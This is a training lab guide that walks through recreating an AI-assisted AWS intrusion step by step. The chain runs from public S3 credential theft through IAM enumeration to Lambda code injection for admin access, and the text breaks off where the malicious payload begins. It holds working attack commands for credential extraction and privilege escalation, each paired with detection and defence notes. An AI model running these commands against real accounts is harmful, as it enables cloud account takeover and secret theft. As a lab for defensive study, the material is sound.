# The 8-Minute Takeover: AI-Assisted AWS Intrusion

## Cloud Attack Simulation Lab -- Complete Step-by-Step Guide

**Level:** Intermediate-Advanced | **Cloud:** AWS | **Estimated Time:** 3-4 hours (learning pace)
**Based on:** Real attack observed by Sysdig Threat Research Team, November 28, 2025
**Published:** February 3, 2026 by Alessandro Brucato and Michael Clark

---

## The Story

A fast-growing AI startup, Acme AI, builds RAG-powered (Retrieval-Augmented Generation) chatbots for enterprise customers. Their ML engineering team uses Amazon Bedrock for embeddings, Lambda functions for data processing pipelines, and S3 for storing training datasets.

One developer, rushing to meet a sprint deadline, hardcodes AWS access keys into a pipeline configuration file and uploads it to an S3 bucket alongside the RAG training data. Another developer, configuring the bucket for a demo, accidentally sets it to public access. A third developer, setting up a Lambda function for EC2 instance initialization, grants its execution role AdministratorAccess "just to get it working" and never revisits the permissions.

Three independent, seemingly minor mistakes. Together, they create a kill chain that an attacker -- assisted by an LLM -- completes in 8 minutes.

The attacker scans for S3 buckets with AI-related names. Finds the RAG data bucket. Downloads the configuration file. Extracts the AWS credentials. Uses them to map the entire AWS environment in under 3 minutes. Discovers the overprivileged Lambda function. Injects code that creates admin access keys. Eight minutes after first contact, the attacker has full administrative control of the AWS account.

What follows is worse: LLMjacking (abusing Bedrock models at the victim's expense), attempts to launch $23,600/month GPU instances, secret harvesting across Secrets Manager and SSM, and creation of backdoor users for persistent access.

You are about to recreate every step of this attack.

---

## Attack Chain Diagram

```
     TIME
      |
      |   T+0:00  INITIAL ACCESS
      |   +-----------------------------------------------+
      |   | PUBLIC S3 BUCKET DISCOVERY                     |
      |   | Scan for buckets with AI naming conventions    |  aws s3 ls (--no-sign-request)
      |   | Download RAG data files                        |  Find pipeline-config.env
      |   | Extract embedded AWS credentials               |  AWS_ACCESS_KEY_ID / SECRET
      |   | MITRE: T1530 (Data from Cloud Storage)         |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:01                   v
      |   +-----------------------------------------------+
      |   | IDENTITY VERIFICATION                          |
      |   | sts:GetCallerIdentity                          |  "Who am I?"
      |   | Discover: rag-pipeline-user                    |  ReadOnly + Lambda write
      |   | MITRE: T1087.004 (Cloud Account Discovery)     |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:02                   v
      |   +-----------------------------------------------+
      |   | MASSIVE RECONNAISSANCE                         |
      |   | Enumerate 12+ AWS services simultaneously:     |  S3, Lambda, EC2, IAM,
      |   | Secrets Manager, SSM, Bedrock, ECS, RDS,       |  CloudWatch, KMS,
      |   | SageMaker, OpenSearch, Organizations            |  SageMaker, OpenSearch
      |   | Speed indicates LLM-assisted automation        |
      |   | MITRE: T1580 (Cloud Infrastructure Discovery)  |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:05                   v
      |   +-----------------------------------------------+
      |   | FAILED ROLE ASSUMPTIONS                        |
      |   | Try: admin, Administrator, sysadmin, netadmin  |  sts:AssumeRole attempts
      |   | All fail -- user lacks sts:AssumeRole          |
      |   | Pivot strategy: use Lambda instead             |
      |   | MITRE: T1078 (Valid Accounts)                  |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:06                   v
      |   +-----------------------------------------------+
      |   | LAMBDA CODE INJECTION                          |
      |   | 1. Discover EC2-init function                  |  lambda:ListFunctions
      |   | 2. Note: execution role = AdminAccess          |  lambda:GetFunction
      |   | 3. Increase timeout 3s -> 30s                  |  UpdateFunctionConfiguration
      |   | 4. Replace code with credential harvester      |  UpdateFunctionCode
      |   | 5. Invoke function                             |  lambda:InvokeFunction
      |   | 6. Read admin credentials from response        |
      |   | MITRE: T1648 (Serverless Execution)            |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:08  <<< ADMIN ACCESS ACHIEVED >>>
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | SECRET HARVESTING                              |
      |   | Secrets Manager: GetSecretValue (3 secrets)    |  DB creds, API keys
      |   | SSM Parameter Store: GetParameter (3 params)   |  Connection strings, JWT
      |   | CloudWatch Logs: search for credentials        |
      |   | MITRE: T1555.006 (Cloud Secrets Mgmt Stores)   |
      |   +------------------------+----------------------+
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | LLMJACKING (Bedrock Abuse)                     |
      |   | Check: model invocation logging disabled?      |  GetModelInvocationLogging
      |   | Invoke: Claude, DeepSeek, Llama, Nova, Titan   |  bedrock:InvokeModel
      |   | Accept model agreements on victim's behalf     |  AWS Marketplace APIs
      |   | MITRE: T1496.004 (Cloud Service Hijacking)     |
      |   +------------------------+----------------------+
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | GPU RESOURCE HIJACKING                         |
      |   | Search for Deep Learning AMIs                  |  ec2:DescribeImages
      |   | Attempt p5.48xlarge ("stevan-gpu-monster")      |  Fails: capacity
      |   | Launch p4d.24xlarge (8x A100, $32.77/hr)       |  $23,600/month
      |   | Public JupyterLab, no auth                     |
      |   | MITRE: T1496.001 (Compute Hijacking)           |
      |   +------------------------+----------------------+
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | PERSISTENCE                                    |
      |   | Create user: backdoor-admin                    |  iam:CreateUser
      |   | Attach: AdministratorAccess                    |  iam:AttachUserPolicy
      |   | Create access keys for backdoor-admin          |  iam:CreateAccessKey
      |   | MITRE: T1098.001 (Additional Cloud Creds)      |
      |   +-----------------------------------------------+
      |
      v
```

---

## What You Will Learn

By the end of this scenario, you will understand:

- **S3 security**: Block Public Access, bucket policies, how credentials leak through data files
- **IAM fundamentals**: Users, groups, policies, roles, the difference between identity-based and resource-based policies
- **Lambda security**: Execution roles, UpdateFunctionCode as a privilege escalation path, code signing
- **Secrets management**: Secrets Manager vs SSM Parameter Store, why least-privilege access to secrets matters
- **Amazon Bedrock**: Model access, invocation logging, LLMjacking as a threat vector
- **CloudTrail**: How every API call is logged and how defenders reconstruct attacks
- **MITRE ATT&CK**: 8+ cloud techniques mapped to real attack steps
- **CNAPP detection**: What Prisma Cloud / Cortex Cloud would alert on at every stage

---

# PART 1: INFRASTRUCTURE SETUP

## Prerequisites

Before starting, ensure you have:

1. **A dedicated AWS lab account** (NEVER use a production account)
2. **AWS CLI v2** installed and configured with admin credentials for your lab account
3. **Terraform** >= 1.10.0 installed
4. **Python 3.10+** installed (for creating the malicious Lambda payload)
5. **jq** installed (for parsing JSON output)

Verify your tools:

```bash
# Check AWS CLI version (should be 2.x)
aws --version

# Check Terraform version (should be >= 1.10.0)
terraform --version

# Check Python version (should be >= 3.10)
python3 --version

# Check jq is installed
jq --version

# Verify you are authenticated to your LAB account (not production!)
aws sts get-caller-identity
```

The `get-caller-identity` output should show your lab account ID. **Stop immediately** if it shows a production account.

## Important: S3 Block Public Access

This scenario requires a publicly accessible S3 bucket. Modern AWS accounts have **account-level S3 Block Public Access (BPA)** enabled by default since April 2023. You need to verify and potentially disable it for this lab.

```bash
# Check current account-level BPA settings
aws s3control get-public-access-block --account-id $(aws sts get-caller-identity --query Account --output text) 2>/dev/null

# If the above returns settings with "true" values, you need to disable them.
# WARNING: Only do this in a dedicated lab account with no other S3 buckets!
aws s3control put-public-access-block \
  --account-id $(aws sts get-caller-identity --query Account --output text) \
  --public-access-block-configuration \
    BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false
```

**What these flags mean:**
- `BlockPublicAcls` -- Blocks any new public ACLs from being set on buckets
- `IgnorePublicAcls` -- Ignores existing public ACLs (makes them ineffective)
- `BlockPublicPolicy` -- Blocks any new bucket policies that grant public access
- `RestrictPublicBuckets` -- Restricts access to buckets with public policies to only AWS services and authorized users

We set all four to `false` to allow our intentionally-public bucket. **Remember to re-enable these during cleanup.**

If you cannot disable account-level BPA (e.g., due to organizational policies), the bucket will not be publicly accessible from anonymous requests, but you can still complete the lab by retrieving the credentials from Terraform outputs (see the fallback note in Step 1 of the attack).

## Deployment Steps

### Step 1: Clone the scenario files

Copy the entire `terraform/` directory to your working machine. The directory structure should be:

```
terraform/
  providers.tf
  variables.tf
  main.tf
  outputs.tf
  terraform.tfvars.example
  lambda/
    ec2_init.py
```

### Step 2: Configure your variables

```bash
cd terraform/

# Copy the example vars file
cp terraform.tfvars.example terraform.tfvars

# Edit terraform.tfvars with your preferred settings.
# At minimum, verify the aws_region matches where you want to deploy.
# Change project_prefix to something unique to you (e.g., your initials).
```

### Step 3: Initialize Terraform

```bash
terraform init
```

**What this does:**
- `terraform init` downloads the required provider plugins (aws, random, archive) into the `.terraform/` directory
- It initializes the backend (local by default) for storing Terraform state
- It validates the provider version constraints from `providers.tf`

**Expected output:**
```
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 5.80"...
- Installing hashicorp/aws v5.8x.x...
...
Terraform has been successfully initialized!
```

### Step 4: Review the execution plan

```bash
terraform plan
```

**What this does:**
- Reads all `.tf` files in the current directory
- Compares desired state (your config) with actual state (nothing yet)
- Shows you exactly what resources will be created
- Does NOT make any changes to AWS

**Expected output:** You should see approximately 25-30 resources to create, including S3 buckets, IAM users, policies, a Lambda function, Secrets Manager secrets, SSM parameters, and optionally a CloudTrail trail.

Review the plan carefully. Verify:
- The S3 bucket name looks correct
- IAM users `rag-pipeline-user`, `frick`, and `rocker` will be created
- The Lambda function `EC2-init` will be created
- Three Secrets Manager secrets and three SSM parameters will be created

### Step 5: Deploy the infrastructure

```bash
terraform apply
```

When prompted, type `yes` to confirm.

**What this does:**
- Creates all resources in your AWS account in dependency order
- Generates access keys for IAM users
- Uploads seed data files to the S3 bucket (including the file with credentials)
- Packages and deploys the Lambda function code
- Stores the resulting state in `terraform.tfstate` (local file)

**Expected output:** After 1-2 minutes:
```
Apply complete! Resources: ~28 added, 0 changed, 0 destroyed.

Outputs:

attack_summary = <<EOT
  ...
EOT
```

### Step 6: Note your attack parameters

```bash
# View the full attack summary
terraform output attack_summary

# Get the S3 bucket name (you will need this first)
terraform output rag_bucket_name
```

Save the bucket name -- this is your starting point for the attack.

**IMPORTANT:** Do NOT look at the compromised credentials via Terraform output yet. Part of the exercise is discovering them organically through the S3 bucket, just like the real attacker did.

---

# PART 2: PRE-ATTACK VERIFICATION

Before starting the attack, verify the infrastructure is running correctly.

## Verify 1: S3 Bucket is Public

```bash
# Try to list the bucket contents without any AWS credentials.
# The --no-sign-request flag tells the CLI to make an anonymous (unsigned) request.
aws s3 ls s3://$(terraform output -raw rag_bucket_name) --no-sign-request
```

**What `--no-sign-request` does:** Sends the HTTP request without AWS Signature V4 authentication headers. If the bucket allows anonymous access, this will work. If BPA is blocking it, you will get an "Access Denied" error.

**Expected output:**
```
                           PRE datasets/
                           PRE config/
                           PRE embeddings/
```

If you see "Access Denied," revisit the S3 Block Public Access section above.

## Verify 2: Lambda Function Exists

```bash
# Using your admin credentials (default profile), verify the Lambda function
aws lambda get-function --function-name EC2-init --query 'Configuration.{Name:FunctionName,Role:Role,Timeout:Timeout,Runtime:Runtime}'
```

**Expected output:**
```json
{
    "Name": "EC2-init",
    "Role": "arn:aws:iam::XXXXXXXXXXXX:role/EC2-init-lambda-execution-role",
    "Timeout": 3,
    "Runtime": "python3.12"
}
```

Verify the role name contains "EC2-init-lambda-execution-role" and the timeout is 3 seconds.

## Verify 3: Secrets Exist

```bash
# List secrets in Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[].Name'

# List SSM parameters
aws ssm describe-parameters --query 'Parameters[].Name'
```

**Expected output:** You should see three secrets (`prod/database/postgres-main`, `prod/api/stripe-secret-key`, `prod/api/sendgrid-api-key`) and three parameters (`/prod/database/connection-string`, `/prod/app/jwt-secret`, `/prod/app/encryption-key`).

## Verify 4: IAM Users Exist

```bash
aws iam list-users --query 'Users[].UserName'
```

**Expected output:** Should include `rag-pipeline-user`, `frick`, and `rocker` (plus any existing users in your account).

## Verify 5: CloudTrail is Logging (if enabled)

```bash
aws cloudtrail get-trail-status --name $(terraform output -raw rag_bucket_name | sed 's/rag-data/attack-lab-trail/' | sed "s/-[a-f0-9]*$/-$(terraform output -raw rag_bucket_name | grep -oP '[a-f0-9]+$')/") 2>/dev/null || echo "CloudTrail check: use the AWS Console to verify the trail is active"
```

Alternatively, simply check the AWS Console: **CloudTrail > Trails** and verify your trail shows "Logging: Yes".

---

# PART 3: ATTACK EXECUTION

From this point forward, you are the attacker. Your admin AWS profile is set aside. You will use ONLY the credentials you discover through the attack chain.

Open a **new terminal window** for the attack. Do not use your admin profile.

---

## STEP 1: Initial Access -- Discover the Public S3 Bucket

### Context (Attacker Mindset)

You are a threat actor scanning the internet for exposed cloud resources. You know that AI/ML companies often use S3 buckets with predictable naming patterns: `rag-data`, `training-data`, `embeddings`, `ml-pipeline`. You use automated tools to scan for these patterns.

In the real attack, the Sysdig TRT observed the attacker finding buckets "named using common AI tool naming conventions." Tools like `bucket-finder`, `S3Scanner`, or even simple DNS brute-forcing can enumerate S3 buckets.

### Concept: S3 Bucket Public Access

**Amazon S3** (Simple Storage Service) stores data as "objects" inside "buckets." Each bucket has a globally unique name. By default, buckets are private -- only the bucket owner can access them. However, a bucket can be made public through:

1. **Bucket policies** -- JSON documents that define who can do what (e.g., `"Principal": "*"` means everyone)
2. **ACLs** (Access Control Lists) -- Legacy access mechanism (predates bucket policies)
3. **S3 Block Public Access** -- An override that blocks public access regardless of policies/ACLs

When all three layers are misconfigured, anyone on the internet can read the bucket contents.

### Commands

```bash
# Simulate discovering the bucket.
# In the real world, you would scan many bucket names. Here, use the known name.
# Replace <BUCKET_NAME> with the bucket name from terraform output.

BUCKET_NAME="<BUCKET_NAME>"

# List the bucket contents anonymously (no credentials needed)
aws s3 ls s3://${BUCKET_NAME}/ --no-sign-request --recursive
```

**Flag breakdown:**
- `s3 ls` -- List objects in an S3 bucket
- `s3://${BUCKET_NAME}/` -- The S3 URI to list
- `--no-sign-request` -- Do not sign the request (anonymous access)
- `--recursive` -- List objects in all "directories" (S3 prefixes)

**Expected output:**
```
2025-xx-xx xx:xx:xx        xxx config/pipeline-config.env
2025-xx-xx xx:xx:xx        xxx datasets/sample-support-tickets.jsonl
2025-xx-xx xx:xx:xx        xxx datasets/training-data-manifest.csv
2025-xx-xx xx:xx:xx        xxx embeddings/README.md
```

The attacker sees several files. The `config/pipeline-config.env` file stands out -- `.env` files often contain credentials.

```bash
# Download the suspicious config file
aws s3 cp s3://${BUCKET_NAME}/config/pipeline-config.env - --no-sign-request
```

**Flag breakdown:**
- `s3 cp` -- Copy a file from S3
- `s3://.../pipeline-config.env` -- Source: the S3 object
- `-` -- Destination: stdout (print to terminal instead of saving to disk)
- `--no-sign-request` -- Anonymous request

**Expected output:**
```
# RAG Pipeline Configuration
# Last updated: 2025-11-20 by devops team
...
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...
AWS_DEFAULT_REGION=us-east-1
...
```

**You just found valid AWS credentials in a public S3 bucket.**

Save these credentials -- you will use them for every subsequent step.

```bash
# Extract and save the credentials
export ATTACKER_KEY_ID=$(aws s3 cp s3://${BUCKET_NAME}/config/pipeline-config.env - --no-sign-request | grep AWS_ACCESS_KEY_ID | cut -d= -f2)
export ATTACKER_SECRET=$(aws s3 cp s3://${BUCKET_NAME}/config/pipeline-config.env - --no-sign-request | grep AWS_SECRET_ACCESS_KEY | cut -d= -f2)
export ATTACKER_REGION=$(aws s3 cp s3://${BUCKET_NAME}/config/pipeline-config.env - --no-sign-request | grep AWS_DEFAULT_REGION | cut -d= -f2)

echo "Key ID: ${ATTACKER_KEY_ID}"
echo "Region: ${ATTACKER_REGION}"
```

> **FALLBACK:** If the bucket is not publicly accessible (account-level BPA is blocking), get the credentials from Terraform:
> ```bash
> export ATTACKER_KEY_ID=$(cd terraform && terraform output -raw compromised_access_key_id)
> export ATTACKER_SECRET=$(cd terraform && terraform output -raw compromised_secret_access_key)
> export ATTACKER_REGION="us-east-1"
> ```

### What Just Happened

You made two S3 API calls:
1. `ListBucket` -- Listed all objects in the bucket (returned as XML, rendered by the CLI)
2. `GetObject` -- Downloaded the `pipeline-config.env` file

Both were unauthenticated because the bucket policy allows `Principal: "*"`. No CloudTrail event is generated for anonymous S3 requests to public buckets (they go to S3 server access logs instead, if enabled). This means the attacker's initial discovery is **invisible to CloudTrail**.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Data from Cloud Storage | **T1530** | Collection |
| Valid Accounts: Cloud Accounts | **T1078.004** | Initial Access |

T1530 specifically names Amazon S3 and describes adversaries accessing "improperly secured cloud storage."

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CSPM** | S3 bucket with Block Public Access disabled | **Critical** |
| **CSPM** | S3 bucket policy allows Principal: * | **Critical** |
| **DSPM** | AWS access keys detected inside S3 objects | **Critical** |

A CNAPP like Prisma Cloud would flag this bucket during its next posture scan (typically every 1-4 hours). The DSPM scanner would detect the AWS access key pattern (`AKIA...`) in the file contents.

**What the SOC would see:** "S3 bucket acme-ai-rag-data-XXXX has public read access enabled and contains objects matching sensitive data patterns (AWS credentials)."

### Defense

1. **Enable S3 Block Public Access** at the account level (prevents any bucket from being public)
2. **Use Amazon Macie** to continuously scan S3 for sensitive data (credentials, PII)
3. **Never store credentials in files** -- use IAM roles and temporary credentials instead
4. **Run TruffleHog** on all files before uploading to S3: `trufflehog s3 --bucket=<name>`
5. **Use an SCP** to deny `s3:PutBucketPolicy` and `s3:PutBucketPublicAccessBlock` except from authorized roles

### Real-World Examples

- **Capital One breach (2019)**: Attacker exploited a misconfigured WAF to access S3 buckets containing 100M+ customer records
- **SCARLETEEL 1.0 (2023)**: Sysdig discovered attackers finding IAM credentials in S3 buckets and Terraform state files
- **Twitch leak (2021)**: Misconfigured S3 server exposed 125GB of source code and internal data

---

## STEP 2: Identity Verification -- Who Am I?

### Context (Attacker Mindset)

You have credentials but do not know what they can do. The first thing any attacker does with stolen AWS credentials is call `GetCallerIdentity` to learn: What account am I in? What identity am I using? What type of principal is this (user, role, federated)?

### Concept: AWS Security Token Service (STS)

**STS** is the AWS service that manages temporary security credentials. The `GetCallerIdentity` API is special: it requires no permissions at all. Even if the IAM user has zero policies attached, this call succeeds. That is why it is always the attacker's first move -- it is guaranteed to work and reveals critical information.

### Commands

```bash
# Configure a named AWS CLI profile for the stolen credentials.
# A "named profile" stores credentials under a label so you can switch
# between identities without overwriting your default profile.
aws configure set aws_access_key_id "${ATTACKER_KEY_ID}" --profile attacker
aws configure set aws_secret_access_key "${ATTACKER_SECRET}" --profile attacker
aws configure set region "${ATTACKER_REGION}" --profile attacker

# Now use the attacker profile to check our identity
aws sts get-caller-identity --profile attacker
```

**Flag breakdown:**
- `aws configure set` -- Writes a single value to `~/.aws/credentials` or `~/.aws/config`
- `--profile attacker` -- Stores under the "attacker" profile name
- `aws sts get-caller-identity` -- Returns the IAM identity making the call

**Expected output:**
```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/service-accounts/rag-pipeline-user"
}
```

### What Just Happened

The CLI sent an HTTP POST to `https://sts.us-east-1.amazonaws.com` with the action `GetCallerIdentity`, signed with the stolen access key. AWS validated the signature (proving you have the secret key), looked up the identity, and returned the ARN.

From the ARN, you learn:
- **Account ID**: `123456789012` (the target AWS account)
- **User path**: `/service-accounts/` (this is a service account, not a human user)
- **User name**: `rag-pipeline-user` (the pipeline service account)

This call IS logged in CloudTrail as a `GetCallerIdentity` event.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Account Discovery | **T1087.004** | Discovery |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | GetCallerIdentity from unusual IP/geolocation | **Medium** |

CDR systems correlate the source IP of API calls with historical patterns. If `rag-pipeline-user` normally calls from within a VPC (via Lambda), a call from an external IP is anomalous.

### Defense

- **Monitor for GetCallerIdentity** from unexpected IPs (a strong indicator of credential theft)
- **Rotate access keys** immediately when compromise is suspected
- **Use IP condition keys** in IAM policies to restrict where credentials can be used:
  ```json
  "Condition": {"IpAddress": {"aws:SourceIp": "10.0.0.0/8"}}
  ```

---

## STEP 3: Reconnaissance -- Enumerate the AWS Environment

### Context (Attacker Mindset)

You know you are `rag-pipeline-user`. Now you need to understand what this identity can access. The real attacker enumerated 12+ AWS services in under 3 minutes -- a speed that Sysdig attributed to LLM-assisted automation. You will do this manually to learn what each call reveals.

### Concept: AWS ReadOnlyAccess

The `ReadOnlyAccess` managed policy grants `Describe*`, `Get*`, `List*` permissions on nearly every AWS service. It is one of the broadest policies AWS offers. Organizations often attach it to service accounts or developer groups "for troubleshooting" without realizing it gives an attacker a complete map of their environment.

### Commands

```bash
# --- IAM Enumeration ---
# List all IAM users in the account
aws iam list-users --profile attacker --query 'Users[].{Name:UserName,Path:Path,Created:CreateDate}' --output table

# List groups for your own user
aws iam list-groups-for-user --user-name rag-pipeline-user --profile attacker

# List your own attached policies
aws iam list-attached-user-policies --user-name rag-pipeline-user --profile attacker

# List your inline policies
aws iam list-user-policies --user-name rag-pipeline-user --profile attacker

# Get details of inline policies
aws iam get-user-policy --user-name rag-pipeline-user --policy-name rag-pipeline-lambda-access --profile attacker
aws iam get-user-policy --user-name rag-pipeline-user --policy-name rag-pipeline-bedrock-access --profile attacker

# List policies attached to your group
aws iam list-attached-group-policies --group-name readonly-users --profile attacker
```

**Expected output (list-users):**
```
--------------------------------------------------------------
|                          ListUsers                          |
+---------------------------+----------+---------------------+
|          Created          |   Name   |        Path         |
+---------------------------+----------+---------------------+
|  2025-...                 |  frick   |  /admins/           |
|  2025-...                 |  rag-... |  /service-accounts/ |
|  2025-...                 |  rocker  |  /service-accounts/ |
+---------------------------+----------+---------------------+
```

Notice: `frick` is in the `/admins/` path. This is a high-value target.

```bash
# Check what policies frick has (ReadOnlyAccess lets us see this)
aws iam list-attached-user-policies --user-name frick --profile attacker
```

**Expected output:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

`frick` has `AdministratorAccess`. If you can create access keys for this user, you own the account.

```bash
# --- Lambda Enumeration ---
# List all Lambda functions
aws lambda list-functions --profile attacker --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Role:Role,Timeout:Timeout}' --output table

# --- S3 Enumeration ---
aws s3 ls --profile attacker

# --- Secrets Manager Enumeration ---
# List secret names (but cannot read values with ReadOnlyAccess alone)
aws secretsmanager list-secrets --profile attacker --query 'SecretList[].{Name:Name,Description:Description}' --output table

# --- SSM Parameter Store ---
aws ssm describe-parameters --profile attacker --query 'Parameters[].{Name:Name,Type:Type,Description:Description}' --output table

# --- EC2 ---
aws ec2 describe-instances --profile attacker --query 'Reservations[].Instances[].{Id:InstanceId,Type:InstanceType,State:State.Name}' --output table 2>/dev/null || echo "No EC2 instances found"

# --- Bedrock ---
aws bedrock list-foundation-models --profile attacker --query 'modelSummaries[].{Id:modelId,Name:modelName,Provider:providerName}' --output table 2>/dev/null | head -30
```

### What Just Happened

You mapped the entire AWS environment. You now know:
- There are 3 IAM users; `frick` is an admin
- There is a Lambda function `EC2-init` with an execution role
- There are 3 secrets in Secrets Manager and 3 SSM parameters
- What Bedrock models are available
- What S3 buckets exist

Each of these API calls was logged in CloudTrail. A CDR system would flag this as an anomalous burst of reconnaissance activity from a service account that normally only calls Bedrock and Lambda.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Infrastructure Discovery | **T1580** | Discovery |
| Cloud Service Discovery | **T1526** | Discovery |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Unusual volume of List/Describe API calls from service account | **High** |
| **CIEM** | Service account has ReadOnlyAccess (excessive permissions) | **Medium** |

### Defense

- **Replace ReadOnlyAccess** with scoped read policies (only the services the account needs)
- **Set up CloudTrail alerts** for burst enumeration patterns (>20 distinct API actions in 5 minutes)
- **Use GuardDuty** -- it detects reconnaissance patterns like rapid `List*` calls

---

## STEP 4: Failed Escalation -- Attempt Role Assumption

### Context (Attacker Mindset)

You know `frick` is an admin. Can you become `frick`? The fastest way would be to assume a role. Let us try common role names -- just like the real attacker tried `admin`, `Administrator`, `sysadmin`, `netadmin`.

### Concept: IAM Role Assumption (sts:AssumeRole)

An **IAM role** is an identity with permissions that can be "assumed" by users, services, or other roles. When you assume a role, STS gives you temporary credentials that have the role's permissions. To assume a role, TWO things must be true:

1. The role's **trust policy** must allow your identity to assume it
2. Your identity must have the **`sts:AssumeRole` permission**

If either condition fails, the assumption is denied.

### Commands

```bash
# Get your account ID
ACCOUNT_ID=$(aws sts get-caller-identity --profile attacker --query Account --output text)

# Try to assume common admin role names
aws sts assume-role --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/admin" --role-session-name test --profile attacker 2>&1 || true
aws sts assume-role --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/Administrator" --role-session-name test --profile attacker 2>&1 || true
aws sts assume-role --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/sysadmin" --role-session-name test --profile attacker 2>&1 || true
```

**Expected output:**
```
An error occurred (AccessDenied) when calling the AssumeRole operation: ...
```

All attempts fail. The `rag-pipeline-user` does not have `sts:AssumeRole` permission and/or these roles do not exist or do not trust this user.

### What Just Happened

Each failed `AssumeRole` call is logged in CloudTrail as an `AccessDenied` event. These failed attempts are actually HIGH-FIDELITY signals for defenders -- legitimate service accounts rarely try to assume admin roles.

### Attacker Pivots

The direct path (assume a role) failed. Time to think creatively. You have `lambda:UpdateFunctionCode` permission. And there is a Lambda function (`EC2-init`) with an admin execution role. What if you replace the function's code with something that uses the admin role to create access keys?

This is the **Lambda code injection** technique: you do not need to assume the role yourself. You make Lambda assume it for you.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Valid Accounts | **T1078** | Defense Evasion |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Multiple failed AssumeRole attempts from service account | **High** |

---

## STEP 5: Lambda Discovery -- Find the Escalation Path

### Context (Attacker Mindset)

You know there is a Lambda function called `EC2-init`. You need to understand its configuration -- especially its execution role. If that role has powerful permissions, you can hijack the function to escalate.

### Concept: Lambda Execution Role

Every Lambda function has an **execution role** -- an IAM role that Lambda assumes when running your code. The permissions of this role determine what the function code can do. If the execution role has `AdministratorAccess`, then any code running in that function has full admin access to the entire AWS account.

This is a known privilege escalation path documented at `pathfinding.cloud/paths/lambda-004` and in Rhino Security Labs' AWS IAM privilege escalation research.

### Commands

```bash
# Get full details about the EC2-init function
aws lambda get-function --function-name EC2-init --profile attacker
```

**Expected output (key fields):**
```json
{
    "Configuration": {
        "FunctionName": "EC2-init",
        "FunctionArn": "arn:aws:lambda:us-east-1:XXXXXXXXXXXX:function:EC2-init",
        "Runtime": "python3.12",
        "Role": "arn:aws:iam::XXXXXXXXXXXX:role/EC2-init-lambda-execution-role",
        "Handler": "ec2_init.lambda_handler",
        "Timeout": 3,
        "MemorySize": 128,
        ...
    }
}
```

Note the **Role** field: `EC2-init-lambda-execution-role`. Let us check what policies it has.

```bash
# Extract the role name from the ARN
ROLE_NAME="EC2-init-lambda-execution-role"

# List the policies attached to this role
aws iam list-attached-role-policies --role-name ${ROLE_NAME} --profile attacker
```

**Expected output:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        {
            "PolicyName": "AWSLambdaBasicExecutionRole",
            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
        }
    ]
}
```

**The execution role has AdministratorAccess.** This is the escalation path. Any code you inject into this function will run with full admin privileges.

### What the attacker is thinking

"I have `lambda:UpdateFunctionCode` permission. This function has an admin execution role. I do not need to assume any role myself. I just need to:
1. Replace the function code with my payload
2. Invoke the function
3. My payload runs with admin privileges
4. It creates new access keys for the admin user and returns them to me"

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Infrastructure Discovery | **T1580** | Discovery |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CIEM** | Lambda execution role has AdministratorAccess (excessive privilege) | **Critical** |
| **CSPM** | Lambda function has no code signing configuration | **Medium** |

---

## STEP 6: Lambda Code Injection -- Privilege Escalation

### Context (Attacker Mindset)

This is the critical step. You will now replace the Lambda function code with a payload that creates admin access keys. In the real attack, the attacker iterated three times before successfully targeting the right admin user. You will get it right the first time because you already enumerated the users.

### Concept: UpdateFunctionCode

The `lambda:UpdateFunctionCode` API replaces a Lambda function's code. Critically, **no `iam:PassRole` permission is required** because the function keeps its existing execution role. The attacker does not need to assign a role -- they are exploiting the role that was already assigned.

The API accepts code as either:
- A zip file uploaded directly (`--zip-file`)
- A reference to an S3 object (`--s3-bucket` + `--s3-key`)
- A container image URI (`--image-uri`)

We will use the zip file method.

### Step 6a: Increase the Lambda Timeout

The current timeout is 3 seconds -- not enough time for IAM API calls. The real attacker increased it to 30 seconds.

```bash
aws lambda update-function-configuration \
  --function-name EC2-init \
  --timeout 30 \
  --profile attacker
```

**Flag breakdown:**
- `update-function-configuration` -- Modify a function's settings (timeout, memory, env vars, etc.)
- `--function-name EC2-init` -- The target function
- `--timeout 30` -- New timeout in seconds

**Expected output:** JSON showing the updated configuration with `"Timeout": 30`.

### Step 6b: Create the Malicious Lambda Code

We will name the Malicious Lambda Code identically to the original file so that the Lambda handler (ec2_init.lambda_handler) still resolves correctly after the code swap -- no need to call UpdateFunctionConfiguration to change the handler, which means one fewer API call in CloudTrail.

Create a file called `ec2_init.py` with the following code:

```bash
cat > /tmp/ec2_init.py << 'PAYLOAD'
import boto3
import json


def lambda_handler(event, context):
    """
    Malicious payload injected by the attacker.

    This code runs with the Lambda execution role's permissions
